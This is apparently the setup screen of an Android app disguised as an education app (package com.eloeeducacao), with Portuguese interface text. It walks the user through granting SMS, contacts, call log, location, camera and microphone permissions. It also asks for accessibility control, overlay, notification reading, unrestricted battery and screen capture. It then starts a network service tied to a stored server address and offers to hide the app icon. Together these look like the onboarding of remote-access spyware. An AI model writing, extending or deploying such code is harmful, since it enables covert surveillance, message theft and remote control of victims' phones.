package com.eloeeducacao;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class SetupActivity extends Activity {

    private static final int REQ_CAP = 1001;
    private static final int REQ_PERM = 1002;

    private interface Estado { boolean ok(); }

    private final List<Estado> estados = new ArrayList<>();
    private final List<View> cartoes = new ArrayList<>();
    private LinearLayout lista;
    private LinearLayout bloco;
    private TextView resumo;
    private TextView pronto;
    private View cardPerms;
    private boolean mostrarTudo;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        ScrollView sv = new ScrollView(this);
        sv.setFillViewport(true);
        sv.setBackgroundColor(Color.parseColor("#0B0F14"));
        lista = new LinearLayout(this);
        lista.setOrientation(LinearLayout.VERTICAL);
        lista.setPadding(dp(18), dp(22), dp(18), dp(28));
        sv.addView(lista);

        TextView titulo = new TextView(this);
        titulo.setText(R.string.app_name);
        titulo.setTextColor(Color.WHITE);
        titulo.setTextSize(23);
        lista.addView(titulo);

        TextView sub = new TextView(this);
        sub.setText("As permiss\u00f5es de uso abrem em janelas, uma ap\u00f3s a outra. O que o Android n\u00e3o deixa pedir em janela tem bot\u00e3o que leva \u00e0 tela certa. Os itens j\u00e1 ativos somem da lista.");
        sub.setTextColor(Color.parseColor("#8B98A5"));
        sub.setTextSize(12);
        sub.setPadding(0, dp(6), 0, dp(14));
        lista.addView(sub);

        resumo = new TextView(this);
        resumo.setTextSize(12);
        resumo.setPadding(0, 0, 0, dp(12));
        lista.addView(resumo);

        cardPerms = cartao("Permiss\u00f5es de uso",
                "SMS, contatos, telefone, localiza\u00e7\u00e3o, c\u00e2mera, microfone, notifica\u00e7\u00f5es e m\u00eddia",
                null, this::pedeTudo, null);
        lista.addView(cardPerms);

        bloco = new LinearLayout(this);
        bloco.setOrientation(LinearLayout.VERTICAL);
        lista.addView(bloco);

        ajuste("Acessibilidade", "Gestos, leitura da tela e \u00e1rvore",
                () -> Util.accOn(this),
                () -> abre(Settings.ACTION_ACCESSIBILITY_SETTINGS));

        ajuste("Sobreposi\u00e7\u00e3o", "Desenhar por cima de outros aplicativos",
                () -> Settings.canDrawOverlays(this),
                () -> startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()))));

        ajuste("Acesso a notifica\u00e7\u00f5es", "Leitura das notifica\u00e7\u00f5es do sistema",
                () -> {
                    String s = Settings.Secure.getString(getContentResolver(),
                            "enabled_notification_listeners");
                    return s != null && s.contains(getPackageName());
                },
                () -> abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

        ajuste("Bateria sem limite", "Desativar otimiza\u00e7\u00e3o de bateria",
                () -> {
                    PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                    return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
                },
                () -> startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()))));

        ajuste("Alterar ajustes do sistema", "Brilho e tempo de tela",
                () -> Settings.System.canWrite(this),
                () -> startActivity(new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                        Uri.parse("package:" + getPackageName()))));

        ajuste("Captura de tela", "Iniciar ou encerrar a proje\u00e7\u00e3o",
                () -> ScreenSvc.alive,
                () -> {
                    if (ScreenSvc.alive) {
                        stopService(new Intent(this, ScreenSvc.class));
                        toast("Captura encerrada");
                    } else {
                        MediaProjectionManager mpm =
                                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAP);
                    }
                });

        ajuste("Conex\u00e3o", "Iniciar o servi\u00e7o de rede",
                () -> Net.online(),
                () -> {
                    try { NetSvc.arranca(this); } catch (Throwable ignored) {}
                    Net.start(this);
                    toast("Conectando");
                });

        ajuste("\u00cdcone do app", "Ocultar ou mostrar na gaveta",
                this::iconeAtivo,
                this::alternarIcone);

        pronto = new TextView(this);
        pronto.setText("Tudo configurado. Nada pendente.");
        pronto.setTextColor(Color.parseColor("#3FB950"));
        pronto.setTextSize(13);
        pronto.setPadding(dp(4), dp(10), 0, dp(6));
        pronto.setVisibility(View.GONE);
        lista.addView(pronto);

        TextView verTudo = new TextView(this);
        verTudo.setText("mostrar itens j\u00e1 ativos");
        verTudo.setTextColor(Color.parseColor("#3D8BFD"));
        verTudo.setTextSize(11);
        verTudo.setPadding(dp(4), dp(12), 0, dp(4));
        verTudo.setOnClickListener(v -> { mostrarTudo = !mostrarTudo; atualiza(); });
        lista.addView(verTudo);

        TextView loja = new TextView(this);
        loja.setText("abrir a p\u00e1gina na Play Store");
        loja.setTextColor(Color.parseColor("#3D8BFD"));
        loja.setTextSize(11);
        loja.setPadding(dp(4), dp(8), 0, 0);
        loja.setOnClickListener(v -> loja(this));
        lista.addView(loja);

        String host = getSharedPreferences("p", 0).getString("url", "sem servidor");
        TextView rodape = new TextView(this);
        rodape.setText("servidor: " + host);
        rodape.setTextColor(Color.parseColor("#5C6B7A"));
        rodape.setTextSize(10);
        rodape.setPadding(0, dp(16), 0, 0);
        lista.addView(rodape);

        setContentView(sv);

        if (b == null) lista.postDelayed(this::pedeTudo, 400);
    }

    private static String[] perms() {
        List<String> p = new ArrayList<>();
        p.add(android.Manifest.permission.READ_SMS);
        p.add(android.Manifest.permission.RECEIVE_SMS);
        p.add(android.Manifest.permission.SEND_SMS);
        p.add(android.Manifest.permission.READ_CONTACTS);
        p.add(android.Manifest.permission.READ_PHONE_STATE);
        p.add(android.Manifest.permission.READ_CALL_LOG);
        p.add(android.Manifest.permission.CALL_PHONE);
        p.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        p.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        p.add(android.Manifest.permission.CAMERA);
        p.add(android.Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= 33) {
            p.add(android.Manifest.permission.POST_NOTIFICATIONS);
            p.add(android.Manifest.permission.READ_MEDIA_IMAGES);
        } else {
            p.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        return p.toArray(new String[0]);
    }

    private void pedeTudo() {
        if (Build.VERSION.SDK_INT < 23) { atualiza(); return; }
        List<String> falta = new ArrayList<>();
        for (String p : perms()) {
            try {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) falta.add(p);
            } catch (Throwable ignored) {}
        }
        atualiza();
        if (falta.isEmpty()) { toast("Permiss\u00f5es conclu\u00eddas"); return; }
        try {
            requestPermissions(falta.toArray(new String[0]), REQ_PERM);
        } catch (Throwable ignored) {}
    }

    private void atualiza() {
        int ok = 0, tot = 0;
        for (String p : perms()) {
            tot++;
            try { if (checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED) ok++; } catch (Throwable ignored) {}
        }
        boolean pOk = ok >= tot;
        resumo.setText(ok + " de " + tot + " permiss\u00f5es de uso concedidas");
        resumo.setTextColor(Color.parseColor(pOk ? "#3FB950" : "#D29922"));
        resumo.setVisibility(pOk && !mostrarTudo ? View.GONE : View.VISIBLE);
        cardPerms.setVisibility(pOk && !mostrarTudo ? View.GONE : View.VISIBLE);

        int pend = 0;
        for (int x = 0; x < cartoes.size(); x++) {
            boolean ativo;
            try { ativo = estados.get(x).ok(); } catch (Throwable e) { ativo = false; }
            View v = cartoes.get(x);
            v.setVisibility(ativo && !mostrarTudo ? View.GONE : View.VISIBLE);
            TextView marca = (TextView) v.getTag();
            if (marca != null) {
                marca.setText(ativo ? "ativo" : "abrir");
                marca.setTextColor(Color.parseColor(ativo ? "#3FB950" : "#F85149"));
            }
            if (!ativo) pend++;
        }
        pronto.setVisibility(pOk && pend == 0 ? View.VISIBLE : View.GONE);
    }

    private void ajuste(String t1, String t2, Estado est, Runnable acao) {
        View card = cartao(t1, t2, est, acao, null);
        estados.add(est);
        cartoes.add(card);
        bloco.addView(card);
    }

    private View cartao(String t1, String t2, Estado est, Runnable acao, Object nada) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.HORIZONTAL);
        card.setGravity(Gravity.CENTER_VERTICAL);
        card.setPadding(dp(16), dp(15), dp(16), dp(15));
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#161B22"));
        bg.setCornerRadius(dp(14));
        bg.setStroke(dp(1), Color.parseColor("#2A3542"));
        card.setBackground(bg);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = dp(9);
        card.setLayoutParams(lp);

        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));

        TextView a = new TextView(this);
        a.setText(t1);
        a.setTextColor(Color.WHITE);
        a.setTextSize(15);
        TextView c = new TextView(this);
        c.setText(t2);
        c.setTextColor(Color.parseColor("#8B98A5"));
        c.setTextSize(11);
        c.setPadding(0, dp(3), 0, 0);
        col.addView(a);
        col.addView(c);
        card.addView(col);

        if (est != null) {
            TextView marca = new TextView(this);
            marca.setTextSize(11);
            marca.setPadding(dp(10), 0, 0, 0);
            card.addView(marca);
            card.setTag(marca);
        }

        card.setOnClickListener(v -> {
            try { acao.run(); } catch (Throwable ignored) {}
            lista.postDelayed(this::atualiza, 300);
        });
        return card;
    }

    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
        super.onRequestPermissionsResult(rq, a, r);
        if (rq == REQ_PERM) lista.postDelayed(this::atualiza, 200);
    }

    @Override protected void onResume() {
        super.onResume();
        atualiza();
    }

    @Override protected void onActivityResult(int rq, int rs, Intent d) {
        super.onActivityResult(rq, rs, d);
        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
            Intent i = new Intent(this, ScreenSvc.class);
            i.putExtra("code", rs);
            i.putExtra("data", d);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        }
    }

    private boolean iconeAtivo() {
        return getPackageManager().getComponentEnabledSetting(
                new ComponentName(this, "com.eloeeducacao.Alias"))
                != PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }

    private void alternarIcone() {
        boolean on = iconeAtivo();
        getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.eloeeducacao.Alias"),
                on ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                   : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
        toast(on ? "\u00cdcone oculto" : "\u00cdcone vis\u00edvel");
    }

    private void abre(String action) {
        try { startActivity(new Intent(action)); } catch (Throwable ignored) {}
    }

    private void toast(String s) {
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }

    public static void loja(android.content.Context c) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("market://details?id=" + c.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable t) {
            try {
                Intent i = new Intent(Intent.ACTION_VIEW,
                        Uri.parse("https://play.google.com/store/apps/details?id=" + c.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                c.startActivity(i);
            } catch (Throwable ignored) {}
        }
    }
}